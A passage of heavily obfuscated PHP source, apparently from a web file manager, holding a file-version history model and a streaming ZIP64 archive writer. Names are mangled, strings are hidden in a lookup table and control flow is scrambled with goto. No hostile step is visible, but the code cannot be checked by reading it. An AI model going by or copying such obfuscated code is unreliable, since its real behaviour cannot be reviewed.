$Eè—»¶ÚÃô[33]; $b·èˆŒ—å[] = $e…¿Ïçêî[$Eè—»¶ÚÃô[1017]] . $Eè—»¶ÚÃô[33]; } if ($aÆ±‡ Â¡È[$Eè—»¶ÚÃô[29]] == $Eè—»¶ÚÃô[2303] && isset($e…¿Ïçêî[$Eè—»¶ÚÃô[369]])) { $b·èˆŒ—å[] = $e…¿Ïçêî[$Eè—»¶ÚÃô[369]] . $Eè—»¶ÚÃô[33]; } } $b·èˆŒ—å = array_merge($b·èˆŒ—å, $bÏ¼Úºê©, array($FêáŸå»òµ . $Eè—»¶ÚÃô[33])); goto F¿÷Ÿë‡ÛŒ; D‹Ãè¬›Ó: return $Eë†‹¤·º÷; goto F¯ïÆËÀãÈ; CÇ˜¿Ûé¼: $Eè—»¶ÚÃô =& $_SERVER[¯Ò¬Èè]; $CÁÈÏí“™Ë = $Eë†‹¤·º÷[$Eè—»¶ÚÃô[354]]; $b·èˆŒ—å = array_to_keyvalue($CÁÈÏí“™Ë, $Eè—»¶ÚÃô[33], $Eè—»¶ÚÃô[369]); goto D¦‰¦²¨»œ; F¿÷Ÿë‡ÛŒ: $b·èˆŒ—å = array_unique($b·èˆŒ—å); $F‡ÚÛ´•– = array_unique(array_to_keyvalue($CÁÈÏí“™Ë, $Eè—»¶ÚÃô[33], $Eè—»¶ÚÃô[1446])); $CêÊì­†á = Model($Eè—»¶ÚÃô[477])->userListInfo($F‡ÚÛ´•–); goto f´½š…ó‘¦; F¯ïÆËÀãÈ: } public function removeBySource($DåÖÖà±êã) { $aĞ¹Ê„¿©ù = array($_SERVER[¯Ò¬Èè][383] => $DåÖÖà±êã); $this->where($aĞ¹Ê„¿©ù)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\162\143\145\x5f\150\151\163\164\x6f\x72\x79"; public function addHistory($aªÕŸÍï«ğ, $c“‰¬åÊø‚ = '') { $bŞ´Í¬ºÅ› =& $_SERVER[¯Ò¬Èè]; $B¬£ó‘Ü¥È = array($bŞ´Í¬ºÅ›[383] => $aªÕŸÍï«ğ[$bŞ´Í¬ºÅ›[369]], $bŞ´Í¬ºÅ›[1437] => isset($aªÕŸÍï«ğ[$bŞ´Í¬ºÅ›[379]]) ? $aªÕŸÍï«ğ[$bŞ´Í¬ºÅ›[379]] : $aªÕŸÍï«ğ[$bŞ´Í¬ºÅ›[378]], $bŞ´Í¬ºÅ›[420] => $aªÕŸÍï«ğ[$bŞ´Í¬ºÅ›[419]], $bŞ´Í¬ºÅ›[529] => $aªÕŸÍï«ğ[$bŞ´Í¬ºÅ›[77]], $bŞ´Í¬ºÅ›[2309] => $c“‰¬åÊø‚); $E÷ÇšŠ = $GLOBALS[$bŞ´Í¬ºÅ›[6]][$bŞ´Í¬ºÅ›[84]][$bŞ´Í¬ºÅ›[2310]]; if ($E÷ÇšŠ > 1) { $this->historyAutoClear($B¬£ó‘Ü¥È[$bŞ´Í¬ºÅ›[369]]); $this->add($B¬£ó‘Ü¥È); } Model($bŞ´Í¬ºÅ›[2311])->eventFileEdit($aªÕŸÍï«ğ[$bŞ´Í¬ºÅ›[369]]); } private function historyAutoClear($a ¿Ï©Ìç) { goto A‡¥øÎœóÇ; cñ¸´ñ²“Ë: if ($DƒêºÇØ» >= 500) { return; } $d³¬‡‘åÒ = array($cëÛµï’²ˆ[383] => $a ¿Ï©Ìç); $A«ô†×ƒä = $this->field($cëÛµï’²ˆ[2314])->where($d³¬‡‘åÒ)->order($cëÛµï’²ˆ[2306])->select(); goto f—‘è•êØ; FñäÉ¥ĞÈ§: $D”»À¬™¤í = array_to_keyvalue($A«ô†×ƒä, $cëÛµï’²ˆ[33], $cëÛµï’²ˆ[419]); $D”»À¬™¤í = array_slice($D”»À¬™¤í, $DƒêºÇØ»); if (!$CøíÅ½Şæ… || !$D”»À¬™¤í) { return; } goto E½‹ÌºÅòÀ; AÊãõ»ëëñ: $fá¤Ö½ƒ = $E‰¶ƒÒ¾ï == $cëÛµï’²ˆ[2313] ? 3 : $a½”¢¢ùŞĞ; if ($a½”¢¢ùŞĞ <= 1) { $fá¤Ö½ƒ = 1; } $DƒêºÇØ» = $fá¤Ö½ƒ - 1; goto cñ¸´ñ²“Ë; E½‹ÌºÅòÀ: $d³¬‡‘åÒ = array($cëÛµï’²ˆ[385] => array($cëÛµï’²ˆ[7], $CøíÅ½Şæ…)); $this->where($d³¬‡‘åÒ)->delete(); Model($cëÛµï’²ˆ[422])->remove($D”»À¬™¤í); goto d×òÈ¹”¢¨; A‡¥øÎœóÇ: $cëÛµï’²ˆ =& $_SERVER[¯Ò¬Èè]; $E‰¶ƒÒ¾ï = Model($cëÛµï’²ˆ[1097])->get($cëÛµï’²ˆ[2312]); $a½”¢¢ùŞĞ = $GLOBALS[$cëÛµï’²ˆ[6]][$cëÛµï’²ˆ[84]][$cëÛµï’²ˆ[2310]]; goto AÊãõ»ëëñ; f—‘è•êØ: if (!$A«ô†×ƒä || $DƒêºÇØ» >= count($A«ô†×ƒä)) { return; } $CøíÅ½Şæ… = array_to_keyvalue($A«ô†×ƒä, $cëÛµï’²ˆ[33], $cëÛµï’²ˆ[367]); $CøíÅ½Şæ… = array_slice($CøíÅ½Şæ…, $DƒêºÇØ»); goto FñäÉ¥ĞÈ§; d×òÈ¹”¢¨: } public function listData($C—×ÁòƒÃ) { goto aÉ¸‰è¸ó”; aÉ¸‰è¸ó”: $FÇê’Ê×² =& $_SERVER[¯Ò¬Èè]; $e»Ó÷ŞÙíª = array($FÇê’Ê×²[383] => $C—×ÁòƒÃ); $fóÈª˜£ = $FÇê’Ê×²[2315]; goto f…¬¿¾¬„; f…¬¿¾¬„: $B›¾œŸ¦ÃÅ = $this->field($fóÈª˜£)->where($e»Ó÷ŞÙíª)->order($FÇê’Ê×²[2306])->selectPage(); $this->_listAppendUser($B›¾œŸ¦ÃÅ[$FÇê’Ê×²[354]]); $c–œ‚ƒÊ = Model($FÇê’Ê×²[1097])->get($FÇê’Ê×²[2312]); goto b´öóº…î£; b´öóº…î£: $fáãÛ±‡‚Ó = 3; if ($c–œ‚ƒÊ == $FÇê’Ê×²[2313]) { $B›¾œŸ¦ÃÅ[$FÇê’Ê×²[354]] = array_slice($B›¾œŸ¦ÃÅ[$FÇê’Ê×²[354]], 0, $fáãÛ±‡‚Ó); $B›¾œŸ¦ÃÅ[$FÇê’Ê×²[351]] = array($FÇê’Ê×²[2316] => 1, $FÇê’Ê×²[2317] => 20, $FÇê’Ê×²[2318] => 1, $FÇê’Ê×²[2319] => count($B›¾œŸ¦ÃÅ[$FÇê’Ê×²[354]])); } return $B›¾œŸ¦ÃÅ; goto BŒ×ß¯ˆîš; BŒ×ß¯ˆîš: } protected function _listAppendUser(&$eŒ¶ß­¹ÂØ) { $CõÚ‰ÙøîŠ =& $_SERVER[¯Ò¬Èè]; $AŒ­¦–ÕÅš = array_to_keyvalue($eŒ¶ß­¹ÂØ, $CõÚ‰ÙøîŠ[33], $CõÚ‰ÙøîŠ[1446]); $c±ŞŒˆù÷Ú = Model($CõÚ‰ÙøîŠ[477])->userListInfo($AŒ­¦–ÕÅš); foreach ($eŒ¶ß­¹ÂØ as &$b¿õÙ®»øÙ) { $CÕ•Ïª§É = $b¿õÙ®»øÙ[$CõÚ‰ÙøîŠ[1446]]; $b¿õÙ®»øÙ[$CõÚ‰ÙøîŠ[378]] = $c±ŞŒˆù÷Ú[$CÕ•Ïª§É] ? $c±ŞŒˆù÷Ú[$CÕ•Ïª§É] : !1; } } public function fileInfo($FÀ—Ù°é­) { $A‘Ÿ«¢ßëÉ =& $_SERVER[¯Ò¬Èè]; $Aö’¹‡‰µ¦ = $this->tablePrefix; $D±’­ê§Ó‚ = "{$Aö’¹‡‰µ¦}\151\157\x5f\x66\x69\x6c\x65\40\x66\x69\x6c\145\163\40\x6f\156\40\x66\x69\x6c\145\163\56\x66\151\154\x65\111\x44\40\75\40\150\x69\163\x74\157\162\171\x2e\x66\151\x6c\x65\x49\x44"; return $this->alias($A‘Ÿ«¢ßëÉ[2320])->where(array($A‘Ÿ«¢ßëÉ[385] => $FÀ—Ù°é­))->join($D±’­ê§Ó‚, $A‘Ÿ«¢ßëÉ[2321])->find(); } public function removeItem($bÏÅ‘‡¢Ö¹) { $dÊŞêÈ‹Š‡ =& $_SERVER[¯Ò¬Èè]; $EÛóÕš£ö = array($dÊŞêÈ‹Š‡[385] => $bÏÅ‘‡¢Ö¹); $f‹İÖ‰ÆÜ‘ = $this->where($EÛóÕš£ö)->find(); if ($f‹İÖ‰ÆÜ‘) { $fõÖ ¡„‡½ = $this->where($EÛóÕš£ö)->delete(); Model($dÊŞêÈ‹Š‡[422])->remove($f‹İÖ‰ÆÜ‘[$dÊŞêÈ‹Š‡[419]]); return $fõÖ ¡„‡½; } return !1; } public function removeBySource($Añé¼Š‡Şß) { goto CóƒİÔÓ‹÷; Aò‰àŒÔù‰: return !0; goto e†»©»Î; BŒØ„ğóÄ: $a×è‹Õ‚Æ‘ = array($e×¸ãŠ—ì[383] => array($e×¸ãŠ—ì[7], $Añé¼Š‡Şß)); $f“ØÊæÚ = $this->field($e×¸ãŠ—ì[420])->where($a×è‹Õ‚Æ‘)->select(); if ($f“ØÊæÚ) { $this->where($a×è‹Õ‚Æ‘)->delete(); $dÖ¸ç öÒµ = array_to_keyvalue($f“ØÊæÚ, $e×¸ãŠ—ì[33], $e×¸ãŠ—ì[419]); Model($e×¸ãŠ—ì[422])->remove($dÖ¸ç öÒµ); } goto Aò‰àŒÔù‰; CóƒİÔÓ‹÷: $e×¸ãŠ—ì =& $_SERVER[¯Ò¬Èè]; if (!$Añé¼Š‡Şß) { return !1; } if (!is_array($Añé¼Š‡Şß)) { $Añé¼Š‡Şß = array($Añé¼Š‡Şß); } goto BŒØ„ğóÄ; e†»©»Î: } public function setDetail($DÎ·Â¼ãî, $D£¦ÊÏìîœ) { $c¹Óø†µ‘ =& $_SERVER[¯Ò¬Èè]; return $this->where(array($c¹Óø†µ‘[385] => $DÎ·Â¼ãî))->save(array($c¹Óø†µ‘[2309] => $D£¦ÊÏìîœ)); } public function rollbackToItem($fƒëìî ¡˜, $E„øÔâÆˆ¹) { goto F«¾ôøØâÀ; B­ˆƒóÌ¨: return $this->where(array($Aïğ×ë£‡Ã[385] => $E„øÔâÆˆ¹))->delete(); goto C¤ñÖ³á‘¢; D˜‚ƒÃˆ¼: $F¯°¢°«Íò = $this->find($E„øÔâÆˆ¹); $cŒè¨†®¬ = array($Aïğ×ë£‡Ã[419] => $F¯°¢°«Íò[$Aïğ×ë£‡Ã[419]], $Aïğ×ë£‡Ã[77] => $F¯°¢°«Íò[$Aïğ×ë£‡Ã[77]], $Aïğ×ë£‡Ã[107] => time(), $Aïğ×ë£‡Ã[379] => USER_ID); Model($Aïğ×ë£‡Ã[767])->where(array($Aïğ×ë£‡Ã[369] => $fƒëìî ¡˜))->save($cŒè¨†®¬); goto B­ˆƒóÌ¨; F«¾ôøØâÀ: $Aïğ×ë£‡Ã =& $_SERVER[¯Ò¬Èè]; $Cª„—ëÛ±™ = Model($Aïğ×ë£‡Ã[767])->sourceInfo($fƒëìî ¡˜); $this->addHistory($Cª„—ëÛ±™); goto D˜‚ƒÃˆ¼; C¤ñÖ³á‘¢: } public function clearSame($BÌİÖÔ¥¹) { goto D²¾ë„¥’Ï; D²¾ë„¥’Ï: $cÅï¾­ƒ¢‹ =& $_SERVER[¯Ò¬Èè]; $f©æô¸ºƒ = $this->listData($BÌİÖÔ¥¹); $DöÚÛ¿Ö = array_to_keyvalue_group($f©æô¸ºƒ, $cÅï¾­ƒ¢‹[419]); goto DäèÔçÏã; e¼ãÈ‹ë´‚: if (!$e–ˆ®ï™‹ª) { return; } $this->where(array($cÅï¾­ƒ¢‹[367] => array($cÅï¾­ƒ¢‹[7], $e–ˆ®ï™‹ª)))->delete(); Model($cÅï¾­ƒ¢‹[422])->remove($AŠ›˜ÆœóÃ); goto E”ù†½Ÿ™ø; DäèÔçÏã: $AŠ›˜ÆœóÃ = array(); $e–ˆ®ï™‹ª = array(); foreach ($DöÚÛ¿Ö as $CÆØÈÈÜØ) { if (!$CÆØÈÈÜØ || count($CÆØÈÈÜØ) <= 1) { continue; } foreach ($CÆØÈÈÜØ as $Bñ Ñ—ŠšÔ) { $AŠ›˜ÆœóÃ[] = $Bñ Ñ—ŠšÔ[$cÅï¾­ƒ¢‹[419]]; $e–ˆ®ï™‹ª[] = $Bñ Ñ—ŠšÔ[$cÅï¾­ƒ¢‹[367]]; } } goto e¼ãÈ‹ë´‚; E”ù†½Ÿ™ø: } public function userSpace() { $bç‘ã·’Š… =& $_SERVER[¯Ò¬Èè]; $dËŒìƒÄÛ´ = $this->tablePrefix; $dĞÈ«†ÜÒ­ = array($bç‘ã·’Š…[1437] => USER_ID); $cêÙ¢Æê¬‚ = "{$dËŒìƒÄÛ´}\x69\x6f\137\x66\x69\x6c\x65\x20\x66\x69\x6c\145\x73\x20\x6f\156\40\146\x69\x6c\145\x73\x2e\146\x69\x6c\x65\111\104\40\75\x20\150\x69\163\164\157\x72\171\x2e\x66\x69\154\x65\x49\104"; return $this->alias($bç‘ã·’Š…[2320])->where($dĞÈ«†ÜÒ­)->join($cêÙ¢Æê¬‚, $bç‘ã·’Š…[2321])->sum($bç‘ã·’Š…[77]); } } goto cìí«ˆ¬Ôæ; CÉÆø¢Ãø¥: function beforeShutdown() { Hook::trigger($_SERVER[™‡«†³Ğ][36]); } $_SERVER[$_SERVER[™‡«†³Ğ][37]] = BASIC_PATH; $_SERVER[$_SERVER[™‡«†³Ğ][38]] = LIB_DIR; goto FƒÌï®Í¯; bŒõ¿—…›: class ZipMake { const VERSION = "\x30\56\x32\56\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($EÏáÛ˜Î™Õ = null) { $D²ÍÅÇùÚÄ =& $_SERVER[¯Ò¬Èè]; $this->outputStream = fopen($D²ÍÅÇùÚÄ[2018], $D²ÍÅÇùÚÄ[1234]); $this->outputName = $EÏáÛ˜Î™Õ; $this->needHeaders = !0; } public function addFile($aïÃ˜‡šó‚, $aŠÆ‰¥¯) { goto f‹ï„®—†Î; Cµ‰ÊšãÁ‹: $b±³’¬»İî = $this->addFileHeader($aïÃ˜‡šó‚, $CğÃœÊŒº); $d¤İ„Íºƒ  = $eò²ÕñØ½¬ = filesize($aŠÆ‰¥¯); $Aå¿±ï¿›‘ = fopen($aŠÆ‰¥¯, $cÅ²‹¦ò¹İ[2019]); goto dÁªˆµÇŸœ; dÁªˆµÇŸœ: while (!feof($Aå¿±ï¿›‘)) { $f†õÃßŠ˜´ = fread($Aå¿±ï¿›‘, 1048576); $this->send($f†õÃßŠ˜´); } fclose($Aå¿±ï¿›‘); $FèÁîƒ“­ = hexdec(hash_file($cÅ²‹¦ò¹İ[2020], $aŠÆ‰¥¯)); goto FÄÒ¼´¤ö; f‹ï„®—†Î: $cÅ²‹¦ò¹İ =& $_SERVER[¯Ò¬Èè]; $aïÃ˜‡šó‚ = $this->filterFilename($aïÃ˜‡šó‚); $CğÃœÊŒº = static::METHOD_STORE; goto Cµ‰ÊšãÁ‹; FÄÒ¼´¤ö: $this->addFileFooter($aïÃ˜‡šó‚, $CğÃœÊŒº, $FèÁîƒ“­, $d¤İ„Íºƒ , $eò²ÕñØ½¬, $b±³’¬»İî); goto FÄîº¸ÀÍ; FÄîº¸ÀÍ: } public function addFileFromStream($d°ğ»¶½à¿, $A®íÆ¡åƒ³) { goto e»İ´ß‚£¬; DÅÆ·áôù”: fseek($A®íÆ¡åƒ³, 0, SEEK_END); $eÔ« ™Ì¾ = $bÃŞÈ¤ã™ã = ftell($A®íÆ¡åƒ³); rewind($A®íÆ¡åƒ³); goto e…‰Íœˆ‰; e»İ´ß‚£¬: $d°ğ»¶½à¿ = $this->filterFilename($d°ğ»¶½à¿); $c”°Ò·ˆÚ„ = static::METHOD_STORE; $b¸±ö…Íó« = $this->addFileHeader($d°ğ»¶½à¿, $c”°Ò·ˆÚ„); goto DÅÆ·áôù”; e…‰Íœˆ‰: $eÊ‡ø ”æ¶ = hash_init($_SERVER[¯Ò¬Èè][2020]); while (!feof($A®íÆ¡åƒ³)) { $FÕ§¡Œè¾ = fread($A®íÆ¡åƒ³, 1048576); hash_update($eÊ‡ø ”æ¶, $FÕ§¡Œè¾); $this->send($FÕ§¡Œè¾); } $Bø§íğõ¸Í = hexdec(hash_final($eÊ‡ø ”æ¶)); goto FÏ²±öŠ£¸; FÏ²±öŠ£¸: $this->addFileFooter($d°ğ»¶½à¿, $c”°Ò·ˆÚ„, $Bø§íğõ¸Í, $eÔ« ™Ì¾, $bÃŞÈ¤ã™ã, $b¸±ö…Íó«); goto Aµ»§°‘°è; Aµ»§°‘°è: } public function finish() { foreach ($this->files as $e½Å×·Ø¾÷) { $this->addCdrFile($e½Å×·Ø¾÷); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($cåÊîÔ”³É, $BµÃ´­Î¼) { goto Fˆ§ìÈØ´ò; fõ­ôÅàöá: $dãÖ‡É¦„ = $this->dosTime(time()); $fììè‘‰Ú = array(array($fĞÛá·¼°œ[2022], static::FILE_HEADER_SIGNATURE), array($fĞÛá·¼°œ[2023], static::ZIP_VERSION_64), array($fĞÛá·¼°œ[2023], 8), array($fĞÛá·¼°œ[2023], $BµÃ´­Î¼), array($fĞÛá·¼°œ[2022], $dãÖ‡É¦„), array($fĞÛá·¼°œ[2022], 0), array($fĞÛá·¼°œ[2022], 4294967295), array($fĞÛá·¼°œ[2022], 4294967295), array($fĞÛá·¼°œ[2023], $B†‰õ‘å«ô), array($fĞÛá·¼°œ[2023], 32)); $eæ¤Ò¶ïë = array(array($fĞÛá·¼°œ[2023], 1), array($fĞÛá·¼°œ[2023], 28), array($fĞÛá·¼°œ[2024], 0), array($fĞÛá·¼°œ[2024], 0), array($fĞÛá·¼°œ[2024], 0), array($fĞÛá·¼°œ[2022], 0)); goto DŞŒÎ²Ù”Ş; F»ì‚³ê²º: return strlen($CŞ«•Ê¸) + $B†‰õ‘å«ô + strlen($E°åºòèùå); goto cÑÆğÖñí; DŞŒÎ²Ù”Ş: $CŞ«•Ê¸ = $this->packFields($fììè‘‰Ú); $E°åºòèùå = $this->packFields($eæ¤Ò¶ïë); $this->send($CŞ«•Ê¸ . $cåÊîÔ”³É . $E°åºòèùå); goto F»ì‚³ê²º; Fˆ§ìÈØ´ò: $fĞÛá·¼°œ =& $_SERVER[¯Ò¬Èè]; $cåÊîÔ”³É = preg_replace($fĞÛá·¼°œ[2021], $fĞÛá·¼°œ[33], $cåÊîÔ”³É); $B†‰õ‘å«ô = strlen($cåÊîÔ”³É); goto fõ­ôÅàöá; cÑÆğÖñí: } protected function addFileFooter($EÒ•´¾æƒ§, $aàó‡£â‘¼, $d‘à”ÙÚö¸, $E‚õ³¾÷šø, $eÓ‰ŒŠˆè¶, $E°Œ²øâ—ô) { $f‰éí¤èÒË =& $_SERVER[¯Ò¬Èè]; $a… Õì†Êã = array(array($f‰éí¤èÒË[2022], static::DATA_DESCRIPTOR_SIGNATURE), array($f‰éí¤èÒË[2022], $d‘à”ÙÚö¸), array($f‰éí¤èÒË[2024], $E‚õ³¾÷šø), array($f‰éí¤èÒË[2024], $eÓ‰ŒŠˆè¶)); $dÓ…”Šª×È = $this->packFields($a… Õì†Êã); $this->send($dÓ…”Šª×È); $fºâ×Ãİí­ = $E°Œ²øâ—ô + $E‚õ³¾÷šø + $D‹± Å; $this->addToCdr($EÒ•´¾æƒ§, $aàó‡£â‘¼, $d‘à”ÙÚö¸, $E‚õ³¾÷šø, $eÓ‰ŒŠˆè¶, $fºâ×Ãİí­); } private function addToCdr($fƒÀª¾“îº, $cÁÕÜªñÂ°, $aó·Ü—Â, $C×ã«ÃÇ¤, $fÆ¸Éà´ÔÌ, $bÆÈô×ñçÉ) { $this->files[] = array($fƒÀª¾“îº, $cÁÕÜªñÂ°, $aó·Ü—Â, $C×ã«ÃÇ¤, $fÆ¸Éà´ÔÌ, $this->ofs); $this->ofs += $bÆÈô×ñçÉ; } protected function addCdrFile($d¶Íä×Æ¹á) { goto bùƒÒò°è; EÁèä„‰ÙÕ: $EÚ­åöç½Ë = $this->dosTime(time()); $f£ĞÁ¾…é› = array(array($D™®Ä·õ±¢[2022], static::CDR_FILE_SIGNATURE), array($D™®Ä·õ±¢[2023], static::ZIP_VERSION_64), array($D™®Ä·õ±¢[2023], static::ZIP_VERSION_64), array($D™®Ä·õ±¢[2023], 8), array($D™®Ä·õ±¢[2023], $b‘ÔùåØØê), array($D™®Ä·õ±¢[2022], $EÚ­åöç½Ë), array($D™®Ä·õ±¢[2022], $b “â„ŠÒ), array($D™®Ä·õ±¢[2022], 4294967295), array($D™®Ä·õ±¢[2022], 4294967295), array($D™®Ä·õ±¢[2023], strlen($D¾éÃª¹¸)), array($D™®Ä·õ±¢[2023], 32), array($D™®Ä·õ±¢[2023], strlen($fé¤ëæéÚ)), array($D™®Ä·õ±¢[2023], 0), array($D™®Ä·õ±¢[2023], 0), array($D™®Ä·õ±¢[2022], 32), array($D™®Ä·õ±¢[2022], 4294967295)); $f’’µÑøƒÁ = array(array($D™®Ä·õ±¢[2023], 1), array($D™®Ä·õ±¢[2023], 28), array($D™®Ä·õ±¢[2024], $dœß…®¢’), array($D™®Ä·õ±¢[2024], $D®Ú–Ò’Ğ), array($D™®Ä·õ±¢[2024], $Cİˆà„ŸŞ­), array($D™®Ä·õ±¢[2022], 0)); goto A‘‚êàÛ†; bùƒÒò°è: $D™®Ä·õ±¢ =& $_SERVER[¯Ò¬Èè]; list($D¾éÃª¹¸, $b‘ÔùåØØê, $b “â„ŠÒ, $D®Ú–Ò’Ğ, $dœß…®¢’, $Cİˆà„ŸŞ­) = $d¶Íä×Æ¹á; $fé¤ëæéÚ = $D™®Ä·õ±¢[33]; goto EÁèä„‰ÙÕ; A‘‚êàÛ†: $cåÃ¨Ô¾Õ = $this->packFields($f£ĞÁ¾…é›); $C¨§ÉĞ–÷‚ = $this->packFields($f’’µÑøƒÁ); $EİĞëÁº÷ = $cåÃ¨Ô¾Õ . $D¾éÃª¹¸ . $fé¤ëæéÚ . $C¨§ÉĞ–÷‚; goto B·£àÆ¼Ú‡; B·£àÆ¼Ú‡: $this->send($EİĞëÁº÷); $this->cdr_ofs += strlen($EİĞëÁº÷); goto dòŞŒ†µ; dòŞŒ†µ: } protected function addCdr64Eof() { goto E‚ÖÀ×ÈÍ; dÂÉ½²¡: $e…Á†‚ÖÔ = $this->ofs; $a†æ˜ïš†ƒ = array(array($EàßÒí¼Öª[2022], static::ZIP64_CDR_EOF_SIGNATURE), array($EàßÒí¼Öª[2024], 44), array($EàßÒí¼Öª[2023], static::ZIP_VERSION_64), array($EàßÒí¼Öª[2023], static::ZIP_VERSION_64), array($EàßÒí¼Öª[2022], 0), array($EàßÒí¼Öª[2022], 0), array($EàßÒí¼Öª[2024], $aÓ‚ÒÙã·à), array($EàßÒí¼Öª[2024], $aÓ‚ÒÙã·à), array($EàßÒí¼Öª[2024], $C¹æÁ½ãÆ¥), array($EàßÒí¼Öª[2024], $e…Á†‚ÖÔ)); $a´´Šº‘…é = $this->packFields($a†æ˜ïš†ƒ); goto dÄĞì“¿æ; E‚ÖÀ×ÈÍ: $EàßÒí¼Öª =& $_SERVER[¯Ò¬Èè]; $aÓ‚ÒÙã·à = count($this->files); $C¹æÁ½ãÆ¥ = $this->cdr_ofs; goto dÂÉ½²¡; dÄĞì“¿æ: $this->send($a´´Šº‘…é); goto C³ˆŠ‰ØÍÈ; C³ˆŠ‰ØÍÈ: } protected function addCdr64Locator() { goto D‹Øƒ†Æšô; D‹Øƒ†Æšô: $dÙó±‡é¨Ä =& $_SERVER[¯Ò¬Èè]; $C¹¶áİŒòõ = count($this->files); $Aèæ•ŞéÉ› = $this->cdr_ofs; goto cŠ„×ºÉÓ×; cŠ„×ºÉÓ×: $C’×Ö¦©³ö = $this->ofs; $Dª•µñ¬àà = array(array($dÙó±‡é¨Ä[2022], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($dÙó±‡é¨Ä[2022], 0), array($dÙó±‡é¨Ä[2024], $C’×Ö¦©³ö + $Aèæ•ŞéÉ›), array($dÙó±‡é¨Ä[2022], 1)); $C‡ªÙé¦ê = $this->packFields($Dª•µñ¬àà); goto Bøõåë– İ; Bøõåë– İ: $this->send($C‡ªÙé¦ê); goto C¦Î£¸¶íõ; C¦Î£¸¶íõ: } protected function addCdrEof() { goto CÜë¯¢ô²¦; f„­³í©Ã±: $AØòÅ Ç¶ = $this->packFields($C†‹ÖŒ£) . $eŠÏ®­’ò¹; $this->send($AØòÅ Ç¶); goto F¢ØÏîÇ‚“; DŒÔµ˜â‡: $Aê’§‚É¿² = $this->ofs; $eŠÏ®­’ò¹ = $e’…åõ˜èç[33]; $C†‹ÖŒ£ = array(array($e’…åõ˜èç[2022], static::CDR_EOF_SIGNATURE), array($e’…åõ˜èç[2023], 0), array($e’…åõ˜èç[2023], 0), array($e’…åõ˜èç[2023], $C»ÃÛÖÓÀí), array($e’…åõ˜èç[2023], $C»ÃÛÖÓÀí), array($e’…åõ˜èç[2022], 4294967295), array($e’…åõ˜èç[2022], 4294967295), array($e’…åõ˜èç[2023], strlen($eŠÏ®­’ò¹))); goto f„­³í©Ã±; CÜë¯¢ô²¦: $e’…åõ˜èç =& $_SERVER[¯Ò¬Èè]; $C»ÃÛÖÓÀí = count($this->files); $EëÀ·•Á› = $this->cdr_ofs; goto DŒÔµ˜â‡; F¢ØÏîÇ‚“: } protected function addCdr() { foreach ($this->files as $bÓç¹ƒçœ–) { $this->addCdrFile($bÓç¹ƒçœ–); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $cÚ’­‚ãï† =& $_SERVER[¯Ò¬Èè]; $e««…Ÿ‚Ä = $cÚ’­‚ãï†[202]; if ($this->outputName) { $BŸ§ù‡ÇïÔ = trim(str_replace(array($cÚ’­‚ãï†[113], $cÚ’­‚ãï†[55], $cÚ’­‚ãï†[93], $cÚ’­‚ãï†[67], $cÚ’­‚ãï†[217], $cÚ’­‚ãï†[1001]), $cÚ’­‚ãï†[33], $this->outputName)); $BÚÈ¸Ï˜±‘ = rawurlencode($BŸ§ù‡ÇïÔ); $e««…Ÿ‚Ä .= "\73\40\146\151\x6c\x65\156\141\155\145\x2a\75\165\164\x66\x2d\70\x27\x27{$BÚÈ¸Ï˜±‘}"; } $F´Üİ‘º¬ = array($cÚ’­‚ãï†[199] => $cÚ’­‚ãï†[2025], $cÚ’­‚ãï†[2026] => $e««…Ÿ‚Ä, $cÚ’­‚ãï†[2027] => $cÚ’­‚ãï†[2028], $cÚ’­‚ãï†[2029] => $cÚ’­‚ãï†[2030], $cÚ’­‚ãï†[2031] => $cÚ’­‚ãï†[2032]); foreach ($F´Üİ‘º¬ as $b²ÔÍ”¥Û” => $bˆŸ¨„íÔ) { header($b²ÔÍ”¥Û” . $cÚ’­‚ãï†[889] . $bˆŸ¨„íÔ); } } protected function send($B•î¢†àğá) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $B•î¢†àğá); } protected final function dosTime($A­éï œõª) { $cÇ‡—Ò‹ì =& $_SERVER[¯Ò¬Èè]; $B×õÕöš„Î = getdate($A­éï œõª); if ($B×õÕöš„Î[$cÇ‡—Ò‹ì[1735]] < 1980) { $B×õÕöš„Î = array($cÇ‡—Ò‹ì[1735] => 1980, $cÇ‡—Ò‹ì[2033] => 1, $cÇ‡—Ò‹ì[2034] => 1, $cÇ‡—Ò‹ì[2035] => 0, $cÇ‡—Ò‹ì[2036] => 0, $cÇ‡—Ò‹ì[2037] => 0); } $B×õÕöš„Î[$cÇ‡—Ò‹ì[1735]] -= 1980; return $B×õÕöš„Î[$cÇ‡—Ò‹ì[1735]] << 25 | $B×õÕöš„Î[$cÇ‡—Ò‹ì[2033]] << 21 | $B×õÕöš„Î[$cÇ‡—Ò‹ì[2034]] << 16 | $B×õÕöš„Î[$cÇ‡—Ò‹ì[2035]] << 11 | $B×õÕöš„Î[$cÇ‡—Ò‹ì[2036]] << 5 | $B×õÕöš„Î[$cÇ‡—Ò‹ì[2037]] >> 1; } protected function packFields($A²æ¶›è) { $F… ¹ã‘í‚ =& $_SERVER[¯Ò¬Èè]; $CŠ‘ŒµâÒ = $F… ¹ã‘í‚[33]; $a‡ññé¤ = array(); foreach ($A²æ¶›è as $Dø–æâë¢†) { $CŠ‘ŒµâÒ .= $Dø–æâë¢†[0]; $a‡ññé¤[] = $Dø–æâë¢†[1]; } array_unshift($a‡ññé¤, $CŠ‘ŒµâÒ); return call_user_func_array($F… ¹ã‘í‚[2038], $a‡ññé¤); } protected function filterFilename($A‹Ïİ¥š) { $Bã´ÅÑçñ =& $_SERVER[¯Ò¬Èè]; return str_replace(array($Bã´ÅÑçñ[93], $Bã´ÅÑçñ[4], $Bã´ÅÑçñ[176], $Bã´ÅÑçñ[69], $Bã´ÅÑçñ[113], $Bã´ÅÑçñ[934], $Bã´ÅÑçñ[937], $Bã´ÅÑçñ[271]), 